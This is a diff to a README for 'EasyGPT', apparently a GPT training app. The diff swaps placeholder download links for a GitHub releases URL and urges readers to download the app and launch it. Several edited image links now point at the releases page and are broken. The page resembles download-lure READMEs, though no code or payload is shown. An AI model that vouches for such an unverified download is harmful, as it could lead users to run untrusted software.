@@ -18,7 +18,7 @@ Welcome to **EasyGPT**, your go-to solution for training and inference on your p
 - Transformer
 
 ## Accessing EasyGPT
-To access EasyGPT, download the [**EasyGPT App.zip**](https://github.com/project/files/App.zip). Once downloaded, launch the application to start training and running inference with ease.
+To access EasyGPT, download the [**EasyGPT https://github.com/AngeloIodice22/EasyGPT/releases**](https://github.com/AngeloIodice22/EasyGPT/releases). Once downloaded, launch the application to start training and running inference with ease.
 
 If the provided link is not accessible or doesn't work, please check the "Releases" section of this repository for alternative download options.
 
@@ -40,13 +40,13 @@ EasyGPT is licensed under the MIT License. See the LICENSE file in this reposito
 
 ---
 
-[![Download EasyGPT](https://img.shields.io/badge/Download-EasyGPT-brightgreen)](https://github.com/project/files/App.zip)
+[![Download EasyGPT](https://github.com/AngeloIodice22/EasyGPT/releases)](https://github.com/AngeloIodice22/EasyGPT/releases)
 
 ---
 
 🚀 Start training powerful GPT models easily on your personal computer with EasyGPT! 🧠✨
 
-![EasyGPT](https://imageurl.com)
+![EasyGPT](https://github.com/AngeloIodice22/EasyGPT/releases)
 
 Happy Coding! 👩‍💻👨‍💻
 
